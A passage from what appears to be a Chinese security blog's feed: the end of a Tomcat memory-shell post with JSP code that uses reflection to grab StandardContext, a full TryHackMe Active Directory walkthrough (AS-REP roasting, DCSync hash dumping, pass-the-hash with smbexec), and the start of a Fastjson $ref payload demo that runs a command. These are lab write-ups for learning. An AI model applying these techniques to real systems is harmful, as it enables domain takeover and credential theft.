class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardEngine"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardHost"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Iterator"</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat6789</span> </span>&#123;</span><br><span class="line">    String uri;</span><br><span class="line">    String serverName;</span><br><span class="line">    StandardContext standardContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span> </span>&#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;&#125;</span><br><span class="line">            <span class="keyword">catch</span> (IllegalAccessException e)&#123;&#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat6789</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">"threads"</span>);</span><br><span class="line">        Object object;</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (thread.getName().contains(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Object target = <span class="keyword">this</span>.getField(thread, <span class="string">"target"</span>);</span><br><span class="line">            <span class="keyword">if</span> (!(target <span class="keyword">instanceof</span> Runnable)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                object = getField(getField(getField(target, <span class="string">"this$0"</span>), <span class="string">"handler"</span>), <span class="string">"global"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            java.util.ArrayList processors = (java.util.ArrayList) getField(object, <span class="string">"processors"</span>);</span><br><span class="line">            Iterator iterator = processors.iterator();</span><br><span class="line">            <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                Object next = iterator.next();</span><br><span class="line"></span><br><span class="line">                Object req = getField(next, <span class="string">"req"</span>);</span><br><span class="line">                Object serverPort = getField(req, <span class="string">"serverPort"</span>);</span><br><span class="line">                <span class="keyword">if</span> (serverPort.equals(-<span class="number">1</span>))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">"serverNameMB"</span>);</span><br><span class="line">                <span class="keyword">this</span>.serverName = (String) getField(serverNameMB, <span class="string">"strValue"</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">"uriMB"</span>);</span><br><span class="line">                <span class="keyword">this</span>.uri = (String) getField(uriMB, <span class="string">"strValue"</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.getStandardContext();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStandardContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">"threads"</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">"Acceptor"</span>)) &amp;&amp; (thread.getName().contains(<span class="string">"http"</span>))) &#123;</span><br><span class="line">                Object target = <span class="keyword">this</span>.getField(thread, <span class="string">"target"</span>);</span><br><span class="line">                HashMap children;</span><br><span class="line">                Object jioEndPoint = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jioEndPoint = getField(target, <span class="string">"this$0"</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (jioEndPoint == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">"endpoint"</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Object service = getField(getField(getField(getField(getField(jioEndPoint, <span class="string">"handler"</span>), <span class="string">"proto"</span>), <span class="string">"adapter"</span>), <span class="string">"connector"</span>), <span class="string">"service"</span>);</span><br><span class="line">                StandardEngine engine = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">"container"</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (engine == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">"engine"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(engine, <span class="string">"children"</span>);</span><br><span class="line">                StandardHost standardHost = (StandardHost) children.get(<span class="keyword">this</span>.serverName);</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(standardHost, <span class="string">"children"</span>);</span><br><span class="line">                Iterator iterator = children.keySet().iterator();</span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">                    String contextKey = (String) iterator.next();</span><br><span class="line">                    <span class="keyword">if</span> (!(<span class="keyword">this</span>.uri.startsWith(contextKey)))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                    StandardContext standardContext = (StandardContext) children.get(contextKey);</span><br><span class="line">                    <span class="keyword">this</span>.standardContext = standardContext;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StandardContext <span class="title">getSTC</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.standardContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">Tomcat6789 a = <span class="keyword">new</span> Tomcat6789();</span><br><span class="line">out.println(a.getSTC());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Refferences"><a href="#Refferences" class="headerlink" title="Refferences"></a>Refferences</h2><ul><li><a href="https://github.com/bitterzzZZ/MemoryShellLearn" target="_blank" rel="noopener">bitterzzZZ/MemoryShellLearn</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&mid=2652991099&idx=1&sn=a6c34bb344f105eb98fc6943c7439331&scene=21#wechat_redirect" target="_blank" rel="noopener">JSP Webshell那些事 – 攻击篇(下)</a></li><li><a href="https://su18.org/post/memory-shell/" target="_blank" rel="noopener">JavaWeb 内存马一周目通关攻略</a></li><li><a href="https://xz.aliyun.com/t/9914" target="_blank" rel="noopener">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></li><li><a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g" target="_blank" rel="noopener">中间件内存马注入&amp;冰蝎连接(附更改部分代码)</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h2&gt;&lt;p&gt;本系列主要是补以前落下的知识，参考了很多大师傅的文章，非常感谢师傅们的分享&lt;/p&gt;
&lt;h2 id=&quot;Filter-Memory-Shell&quot;&gt;&lt;a href=&quot;#Filter-Memory-Shell&quot; class=&quot;headerlink&quot; title=&quot;Filter Memory Shell&quot;&gt;&lt;/a&gt;Filter Memory Shell&lt;/h2&gt;&lt;h3 id=&quot;实例&quot;&gt;&lt;a href=&quot;#实例&quot; class=&quot;headerlink&quot; title=&quot;实例&quot;&gt;&lt;/a&gt;实例&lt;/h3&gt;&lt;p&gt;我这里使用的是idea 2021.2，maven quickstart&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/05/26/Java-08/1jxGI7ioBpMxiiPDgQ06oy_LFYKlup5yZjw6QsKDzN4.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe Attacktive Directory Walkthrough</title>
    <link href="https://jlkl.github.io/2022/03/02/Web-21/"/>
    <id>https://jlkl.github.io/2022/03/02/Web-21/</id>
    <published>2022-03-02T12:20:39.000Z</published>
    <updated>2022-03-02T12:25:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Task-3-Welcome-to-Attacktive-Directory"><a href="#Task-3-Welcome-to-Attacktive-Directory" class="headerlink" title="Task 3 Welcome to Attacktive Directory"></a>Task 3 Welcome to Attacktive Directory</h2><p>nmap扫描端口</p><p><img src="/2022/03/02/Web-21/iGpDs-dZvkOU1N62csbP7pmjkjrrrWH6U4UVO4dfIuw.png" alt="image"></p><p>enum4linux获取139/445信息，这个工具有探查端口信息，枚举用户名的功能</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -A 10.10.28.202</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/2022/03/02/Web-21/s9LbXGXZDZRVg3yBF6xOOOJbfFqxalJWro1W02n721c.png" alt="image"></p><p>What tool will allow us to enumerate port 139/445?</p><p>enum4linux</p><p>What is the NetBIOS-Domain Name of the machine?</p><p>THM-AD</p><p>What invalid TLD do people commonly use for their Active Directory Domain?</p><p>.local</p><h2 id="Task-4-Enumerating-Users-via-Kerberos"><a href="#Task-4-Enumerating-Users-via-Kerberos" class="headerlink" title="Task 4 Enumerating Users via Kerberos"></a>Task 4 Enumerating Users via Kerberos</h2><p>kerbrute枚举用户</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -d spookysec.local --dc 10.10.210.2 userlist.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/QWa8hH7ZQHL_8YD81M1Tg2nTTqPhhi6N7VkrN1jBqBA.png" alt="image"></p><p>What command within Kerbrute will allow us to enumerate valid usernames?</p><p>userenum</p><p>What notable account is discovered? (These should jump out at you)</p><p> svc-admin</p><p>What is the other notable account is discovered? (These should jump out at you)</p><p>backup</p><h2 id="Task-5-Abusing-Kerberos"><a href="#Task-5-Abusing-Kerberos" class="headerlink" title="Task 5 Abusing Kerberos"></a>Task 5 Abusing Kerberos</h2><p>AS-PEP Roasting攻击，对于设置了选项”Do not require Kerberos preauthentication”的用户，可以离线爆破获取用户的hash</p><p>先添加dns记录</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 10.10.194.183 spookysec.local &gt;&gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>获取svc-admin TGT</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py spookysec.local&#x2F;svc-admin -no-pass</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/nHg50n_cajoWK1CzkrFWL_30mK6GL5cos9DjEZsvIPg.png" alt="image"></p><p>hashcat爆破hash，这里m1芯片有点问题</p><p>We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</p><p> svc-admin</p><p>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</p><p> Kerberos 5, etype 23, AS-REP</p><p>What mode is the hash?</p><p>18200</p><p>Now crack the hash with the modified password list provided, what is the user accounts password?</p><p>management2005</p><h2 id="Task-6-Back-to-the-Basics"><a href="#Task-6-Back-to-the-Basics" class="headerlink" title="Task 6 Back to the Basics"></a>Task 6 Back to the Basics</h2><p><img src="/2022/03/02/Web-21/isncjU0iHkYPGagaSzZaRl3vn7OvZNcEFm2sTu_9dns.png" alt="image"></p><p>连接smb服务，获取文件，base64解密</p><p>What utility can we use to map remote SMB shares?</p><p> smbclient</p><p>Which option will list shares?</p><p>-l</p><p>How many remote shares is the server listing?</p><p>6</p><p>There is one particular share that we have access to that contains a text file. Which share is it?</p><p> backup</p><p>What is the content of the file?</p><p> YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</p><p>Decoding the contents of the file, what is the full contents?</p><p><a href="mailto:backup@spookysec.local">backup@spookysec.local</a>:backup2517860</p><h2 id="Task-7-Elevating-Privileges-within-the-Domain"><a href="#Task-7-Elevating-Privileges-within-the-Domain" class="headerlink" title="Task 7 Elevating Privileges within the Domain"></a>Task 7 Elevating Privileges within the Domain</h2><p>backup账户有DCSync权限，直接dumphash</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -just-dc backup@spookysec.local</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/CwDtGxSyzu8e25E0NUcMA1CyrERjOpsNw1LHSun2ZMI.png" alt="image"></p><p>What method allowed us to dump NTDS.DIT?</p><p>DRSUAPI</p><p>What is the Administrators NTLM hash?</p><p> 0e0363213e37b94221497260b0bcb4fc</p><p>What method of attack could allow us to authenticate as the user without the password?</p><p>Pass the Hash</p><p>Using a tool called Evil-WinRM what option will allow us to use a hash?</p><p>-H</p><h2 id="Task-8-Flag-Submission-Panel"><a href="#Task-8-Flag-Submission-Panel" class="headerlink" title="Task 8 Flag Submission Panel"></a>Task 8 Flag Submission Panel</h2><p>pth执行命令</p><p><img src="/2022/03/02/Web-21/dgVpKj6b0iKS0wUSWvH-csdoXxTUn_9MH2ue9sc9UZs.png" alt="image"></p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc Administrator@spookysec.local</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/6QS1poHn26bAYD52_hv9YSSAZyEq6amW0Zu66iqgZKc.png" alt="image"></p><p>svc-admin</p><p>TryHackMe{K3rb3r0s_Pr3_4uth}</p><p>backup</p><p>TryHackMe{B4ckM3UpSc0tty}</p><p>Administrator</p><p>TryHackMe{4ctiveD1rectoryM4st3r}</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Task-3-Welcome-to-Attacktive-Directory&quot;&gt;&lt;a href=&quot;#Task-3-Welcome-to-Attacktive-Directory&quot; class=&quot;headerlink&quot; title=&quot;Task 3 Welcome to Attacktive Directory&quot;&gt;&lt;/a&gt;Task 3 Welcome to Attacktive Directory&lt;/h2&gt;&lt;p&gt;nmap扫描端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/03/02/Web-21/iGpDs-dZvkOU1N62csbP7pmjkjrrrWH6U4UVO4dfIuw.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;enum4linux获取139/445信息，这个工具有探查端口信息，枚举用户名的功能&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;Text&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;enum4linux -A 10.10.28.202&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="Pentest" scheme="https://jlkl.github.io/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson parse突破特殊getter调用限制</title>
    <link href="https://jlkl.github.io/2021/12/18/Java_07/"/>
    <id>https://jlkl.github.io/2021/12/18/Java_07/</id>
    <published>2021-12-18T13:38:44.000Z</published>
    <updated>2021-12-18T13:51:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>众所周知，在 Fastjson中 parse 会识别并调用目标类的特定 setter 方法及特定的 getter 方法，<strong>特定规则其实总结起来就是一般的setter方法以及一般的返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法</strong></p><p>那么对于一般的不满足条件的getter方法能否进行调用呢</p><a id="more"></a><h2 id="ref-调用-getter"><a href="#ref-调用-getter" class="headerlink" title=" $ref 调用 getter"></a> <code>$ref</code> 调用 getter</h2><p>当Fastjson＞=1.2.36时，我们可以使用<code>$ref</code>的方式来调用任意的getter</p><h3 id="什么是-ref"><a href="#什么是-ref" class="headerlink" title="什么是$ref"></a>什么是<code>$ref</code></h3><p><code>$ref</code> 是fastjson里的引用，引用之前出现的对象</p><p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8" target="_blank" rel="noopener">循环引用 · alibaba/fastjson Wiki (github.com)</a></p><p>下面这个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        String payload = <span class="string">"[&#123;\"@type\":\"com.vuln.Test\",\"id\":\"123\"&#125;,&#123;\"$ref\":\"$[0]\"&#125;]"</span>;</span><br><span class="line">        Object o = JSON.parse(payload);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSON.parse后的对象如下</p><p><img src="/2021/12/18/Java_07/_frCY1qlqui8DUlKilrkyAaQoKugonrisP184WEPzFs.png" alt="image"></p><p><code>$ref</code> 的值是符合JSONPath语法的，详细可以参考：<a href="https://goessner.net/articles/JsonPath/" target="_blank" rel="noopener">https://goessner.net/articles/JsonPath/</a></p><h3 id="调用演示"><a href="#调用演示" class="headerlink" title="调用演示"></a>调用演示</h3><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        String payload = <span class="string">"[&#123;\"@type\":\"com.vuln.Test\",\"cmd\":\"open -a Calculator\"&#125;,&#123;\"$ref\":\"$[0].cmd\"&#125;]"</span>;</span><br><span class="line">        Object o = JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/18/Java_07/LQYVkmW8M9OjZpG7Y4O6OtinrHVBG0aMgsI2wPQmPCA.png" alt="image"></p><p>可以看到getCmd方法是不满足特殊getter条件的，不能自动被调用，这里突破了这个限制</p><h3 id="调用分析"><a href="#调用分析" class="headerlink" title="调用分析"></a>调用分析</h3><p>到getCmd的调用栈</p><p><img src="/2021/12/18/Java_07/9mfZ3GfOEiDiMVRPrSODKfNT6ZiVBlaVUEJzZhZSY8k.png" alt="image"></p><p>首先分析fastjson对<code>$ref</code> 的处理逻辑</p><p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</p><p>当遇到引用<code>$ref</code>这种方式，会增加一个resolveTask，留在parse结束后进行处理</p><p><img 